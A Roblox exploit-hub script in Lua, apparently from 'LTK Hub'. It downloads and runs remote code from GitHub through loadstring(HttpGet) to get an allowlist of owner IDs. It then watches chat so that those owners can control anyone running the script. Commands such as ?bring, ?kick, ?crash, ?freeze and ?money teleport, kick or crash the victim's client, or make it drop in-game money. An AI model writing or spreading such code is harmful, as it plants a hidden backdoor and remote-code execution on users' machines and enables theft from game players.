local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6hfeuopteafumbvyue507421.lua"
    local Players = game:GetService("Players")
    local TeleportService = game:GetService("TeleportService")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    local PlaceId = game.PlaceId
    
    local allowedUserIds = {}
    
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    
    if success then
        allowedUserIds = result
    else
        warn("Failed to load allowed User IDs:", result)
    end
    
    local function waitForCharacter(player)
        if player.Character and player.Character.Parent then
            return player.Character
        end
        local character = nil
        repeat
            character = player.Character or player.CharacterAdded:Wait()
            task.wait()
        until character and character.Parent
        return character
    end
    
    local function ensureLocalPlayerCharacter()
        if not LocalPlayer.Character or not LocalPlayer.Character.Parent then
            waitForCharacter(LocalPlayer)
        end
    end
    
    local function isAllowed(player)
        for _, allowedId in ipairs(allowedUserIds) do
            if tostring(player.UserId) == tostring(allowedId) then
                return true
            end
        end
        return false
    end
    
    local function bringExecutorToCaller(caller)
        local callerCharacter = waitForCharacter(caller)
        local executorCharacter = waitForCharacter(LocalPlayer)
        local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/extra/lib.lua"))()
            local Notif = library:InitNotifications()
            --executorHRP.CFrame = callerHRP.CFrame * CFrame.new(0,55,0)
            game:GetService("RunService"):BindToRenderStep("bring", 0, function()
                workspace.CurrentCamera.CameraType = Enum.CameraType.Fixed
                workspace.CurrentCamera.CFrame = CFrame.new(9e9, 9e9, 9e9)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,6,0)
                game.Players.LocalPlayer.Character.Humanoid:ChangeState("Freefall")
                task.wait(0.2)
                executorHRP.CFrame = callerHRP.CFrame * CFrame.new(0,3,0)
            end)
            task.wait(0.79)
            game:GetService("RunService"):UnbindFromRenderStep("bring")
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(7)
            task.wait(0.3)
            workspace.CurrentCamera.CameraType = Enum.CameraType.Track
            task.wait(0.1)
            for i=1,3 do
                local Success = Notif:Notify("LTK: Hub | Cytox has just brought you", 8, "success")
            end
        else
            warn("HumanoidRootPart is missing for caller or executor.")
        end
    end
    
    local function rejoinExecutor()
        local currentJobId = game.JobId
        TeleportService:TeleportToPlaceInstance(PlaceId, currentJobId, LocalPlayer)
    end
    
    local function kickExecutor()
        local character = waitForCharacter(LocalPlayer)
        if character then
            LocalPlayer:Kick("You have been kicked by an developer")
        else
            warn("Failed to kick: Character is not loaded.")
        end
    end

    local function freezeExecutor()
        local executorCharacter = waitForCharacter(LocalPlayer)
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            executorHRP.Massless = true
        else
            print("HumanoidRootPart is missing for caller or executor.")
        end
    end
    
    local function unfreezeExecutor()
        local callerCharacter = waitForCharacter(caller)
        local executorCharacter = waitForCharacter(LocalPlayer)
        local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            executorHRP.Massless = false
        else
            warn("HumanoidRootPart is missing for caller or executor.")
        end
    end

    local function Message()
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/extra/lib.lua"))()
        local Notif = library:InitNotifications()
        for i=1,20 do
            local Test = Notif:Notify("LTK: Hub | A Owner has just pung your client, If you see this a owner is in your game!", 20, "success")
            --game.StarterGui:SetCore("SendNotification", { Title = "LTK: Hub", Text = "If you see this, the owner of LTK: Hub is in ur game!", Duration = 10})
        end
    end

    local function Money()
        for i=1, 30 do
            task.wait(0.5)
            game:GetService("ReplicatedStorage"):WaitForChild("GiveMoney"):FireServer("drop", 10000)
        end
    end

    local function Crash()
        getgenv().crashing = true
        while getgenv().crashing == true do
            print("crash attempt [0x01]")
        end
    end

    local function Freeze()
       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
    end

    local function Unfreeze()
        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
    end

    local function attachChatListener(player)
        player.Chatted:Connect(function(message)
            if isAllowed(player) then
                if message == "?bring" then
                    bringExecutorToCaller(player)
                elseif message == "?rj" then
                    rejoinExecutor()
                elseif message == "?kick" then
                    kickExecutor()
                elseif message == "?freeze" then
                    Freeze() --freezeExecutor()
                elseif message == "?unfreeze" then
                    Unfreeze() --unfreezeExecutor()
                elseif message == "?test" then
                    Message()
                elseif message == "?money" then
                    Money()
                elseif message == "?crash" then
                    Crash()
                end
            end
        end)
    end
    
    local function checkExistingPlayers()
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                attachChatListener(player)
            end
            player.CharacterAdded:Connect(function()
                attachChatListener(player)
            end)
        end
    end
    
    ensureLocalPlayerCharacter()
    
    checkExistingPlayers()
    
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function()
            attachChatListener(player)
        end)
    end)
    
    RunService.Heartbeat:Connect(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if isAllowed(player) then
                break
            end
        end
    end)
